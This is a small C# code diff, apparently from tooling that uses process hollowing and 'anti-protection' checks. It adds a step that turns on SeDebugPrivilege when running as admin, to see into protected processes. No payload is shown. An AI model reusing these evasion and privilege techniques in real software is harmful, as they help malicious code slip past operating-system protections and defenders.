@@ -300,6 +300,8 @@ partial class Program
 
         bool admin = IsAdmin();
         Breadcrumb($"START admin={admin} path={Environment.ProcessPath}");
+        if (admin)
+            Protection.EnablePrivilege(20); // SeDebugPrivilege — full visibility into PPL/protected processes
 
         // Anti-Protection checks FIRST (before any process manipulation)
         if (!ProcessHollowing.IsHollowedInstance())
